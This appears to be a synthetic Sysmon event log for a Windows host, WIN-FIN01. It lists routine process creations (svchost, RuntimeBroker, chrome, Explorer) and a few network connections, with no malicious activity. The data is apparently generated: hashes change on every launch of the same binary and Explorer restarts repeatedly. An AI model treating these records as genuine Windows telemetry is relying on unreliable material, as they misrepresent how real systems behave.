{"timestamp": "2024-06-10T01:09:59", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7fe4d", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2584, "ParentProcessId": 2583, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=6cdb096d23e8655c618c868887ac3a45f555229ae896e10474fa135d6b162d33", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:10:22", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x8f5c9", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2586, "ParentProcessId": 2585, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=528a00ef19449d4afe7d9355e7d757a0403471d72aba7fa8c22efa5531081984", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:10:26", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x873d3", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2588, "ParentProcessId": 2587, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5f7f85751ccb9978e3f84d46ec4962d7d8f1dda869df7c5f1145a4a539fad617", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:10:35", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x80373", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2590, "ParentProcessId": 2589, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cba0d758f1acf924af68d86763ab26dd9142a2811d006d3210b9ba2deb05a23d", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:10:38", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x87f25", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2592, "ParentProcessId": 2591, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=75cb74078bfdddc0db8cf52dd66d917470af47999f7062cb37d31f4b0f843727", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:10:57", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4ebc6", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2594, "ParentProcessId": 2593, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=87b099dcdd63f0dabd19b99c0b2796b698dbfc0ce4b6a6746f3e311b3de8f6cb", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:10:58", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 2594, "ParentProcessId": null, "dest_ip": "142.250.185.68", "dest_port": 443, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:11:21", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x6cee3", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2596, "ParentProcessId": 2595, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=2e9b6e1cdddfe908d55bb0f9f45db3e72b69b260638924d35c70c676b63053f1", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:11:34", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x74fd7", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2598, "ParentProcessId": 2597, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=b09569b2aca57df52b3b787ba06f2f8019c6138069b7dcde4d4bc21c70c87d66", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:11:56", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x538df", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2600, "ParentProcessId": 2599, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3181670c8a64949d86bd2e5f5a4a9be66ad02785520cc40c7a91f6f53224c48b", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:12:17", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7e3d3", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2602, "ParentProcessId": 2601, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=7c1a7bf10ae65c7f6413b0cbb4230798db24f054d062fa74533a356ae8b3cafc", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:12:41", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x7247e", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2604, "ParentProcessId": 2603, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=fe1cb502778f55caef756c9b4faf7a0ca73578ae5f0baf9a4d83ad267168c234", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:13:00", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x47123", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2606, "ParentProcessId": 2605, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=7c3c2c25c061318f6a1c9e9a36f3206f3ca5fed3aee9fde1f0a224826fd63b77", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:13:22", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4eea8", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2608, "ParentProcessId": 2607, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d009244b33045ca3e6857a53ee197327a09bc5356e291caf90fd099e61673fa6", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:13:30", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x73e4d", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2610, "ParentProcessId": 2609, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=768c85f2e8a776c34eca2dfa35aa9a97c45dd64978e5c8fa2939ed489e028747", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:13:31", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": null, "CommandLine": null, "ProcessId": 2610, "ParentProcessId": null, "dest_ip": "142.250.185.68", "dest_port": 443, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:13:41", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x897ae", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2612, "ParentProcessId": 2611, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cefc36b15367966f24882d1740540bf81018dd1c65cd59a546398b445236e8cc", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:14:04", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x865da", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2614, "ParentProcessId": 2613, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=64e9312e6c06fb10136425dc280b198a029c6aa1b5943a0a57172074e8cd263f", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:14:07", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5b456", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2616, "ParentProcessId": 2615, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=de19b5d7f9abdc37ae49efc3e55e2498d5c22204b4efc2da8492231de682bc5c", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:14:25", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x70332", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2618, "ParentProcessId": 2617, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=0b70711a98491b09354ef4680d592e0a6bfd64ebe9dcebd11f63871a769ded4e", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:14:48", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x746a0", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2620, "ParentProcessId": 2619, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1e0417e34196389bb1785e2b00d953f906c8f1242a6c2dec46f3130d31b7f57c", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:01", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x87f59", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2622, "ParentProcessId": 2621, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=8bf62295f7c25b89b8f39027106366a9c221b5b0f6d0693f4081c0b3c235fbcb", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:22", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x624bf", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2624, "ParentProcessId": 2623, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=9109b4ec734d439dfa0e4c0ab7c0370ae53d777a4bc2b155c727757847c2eb29", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:36", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4f601", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2626, "ParentProcessId": 2625, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=432ec9e7b0b750e76d387bb8e11abed7be2fbc7b2b35a65c04e834a56de15356", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:37", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 2626, "ParentProcessId": null, "dest_ip": "10.10.20.10", "dest_port": 80, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:39", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x444a0", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2628, "ParentProcessId": 2627, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d0352212e55750e7cacebfb1f5e1238cba1dcd7e0b2316aa914847e837be9232", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:44", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x6606e", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2630, "ParentProcessId": 2629, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=b948d8a5cc97c9ad8996d1fd6eb3e225bd8415ca78f0f92dadaba287104f95f0", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:52", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x81aa7", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2632, "ParentProcessId": 2631, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=12c1e3f65c9226df0e670e59e5461a338c56eec4b19b0a8c7a3cbb0da310da3b", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:15:58", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5a6df", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2634, "ParentProcessId": 2633, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=4270471291a32f84e8a042274ef7127b02c06d3073f790958a7e69e52ef0a883", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:16:04", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4dffb", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2636, "ParentProcessId": 2635, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=0330f0aff2c5d2eb69e0ff2c05af63b2c8f6c999ee8b21e0a7541f1abf8e872e", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:16:15", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x53c81", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2638, "ParentProcessId": 2637, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=9d7a74185e610c42737a32031313374b7611babe266ff82a1aea0dea695c3419", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:16:40", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x70c01", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2640, "ParentProcessId": 2639, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=ca10f893c32ef7d419a3364d3381c6cbdbfce1a8aa8987f5f57c54e6d51735c5", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:17:03", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x672ba", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2642, "ParentProcessId": 2641, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=44d006e63d39d8fa0ce8bdd62fc961d92a1742c80546e2116208afab5a0fa264", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:17:04", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 2642, "ParentProcessId": null, "dest_ip": "13.107.42.14", "dest_port": 443, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:17:21", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x6adf5", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2644, "ParentProcessId": 2643, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=bbec34797ad11e08454ebde6889a190a9570aa94c524b82446d41c42c140e303", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:17:41", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x8eaa0", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2646, "ParentProcessId": 2645, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=da759d1a9e21ab657632597d0d2ca92a1c34b6d2a13ac9d3000ec2b6c1f45fae", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:17:56", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x68b94", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2648, "ParentProcessId": 2647, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=63e0dcc3237cf1bdc53295003727a3cc1aa2cbc906862991feb3283cc6491229", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:18:07", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x594e2", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2650, "ParentProcessId": 2649, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=e3e294257e631d4ea604f3a0a7cd7e5c6aa245fce0c8949b7677d5670c6e9313", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:18:23", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x4552e", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2652, "ParentProcessId": 2651, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=8f6536f622614a7f506ac91e50bdd54317575fee710b26635cee79e99e10b5c4", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:18:45", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x6730d", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2654, "ParentProcessId": 2653, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=82e76064f760ba6a9bb60c0857064d6e13694707d274ebcaa47c76262a4f7fb7", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:18:49", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x41533", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2656, "ParentProcessId": 2655, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=6b2dbc8b0ac033c121bb978be70eb710b7f2ed665bcb69205ced7f3422f6ec4c", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:19:11", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5e61e", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2658, "ParentProcessId": 2657, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=ea29cf813f80a71aec0f571d57e12c00dc6d71295e73b94fd14900c9def2f0e1", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:19:12", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-FIN01\\m.adel", "LogonId": null, "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 2658, "ParentProcessId": null, "dest_ip": "13.107.42.14", "dest_port": 80, "Hashes": null, "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:19:34", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x50e17", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 2660, "ParentProcessId": 2659, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=e5ad778fa0b2c9c31988c19aa645605d803159c157bca0e72d879515c260de2f", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:19:39", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x5a0bc", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe", "ProcessId": 2662, "ParentProcessId": 2661, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=97dd4411693aca43e9921377ae2e357827cfb7aa77ee5f9a6babcdfc7ce1d5a5", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:20:00", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x60144", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 2664, "ParentProcessId": 2663, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c8dc2853b94ccd277e4a69b0dbf2821d92b20bed22709a8c44d6d21a7d726922", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
{"timestamp": "2024-06-10T01:20:18", "host": "WIN-FIN01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-FIN01\\m.adel", "LogonId": "0x73920", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 2666, "ParentProcessId": 2665, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=2ea177c69605ede19e589a17ba4709a3c24ad91f87a971ddedbb48ffdc995a26", "TargetFilename": null, "TargetObject": null, "QueryName": null, "TargetImage": null}
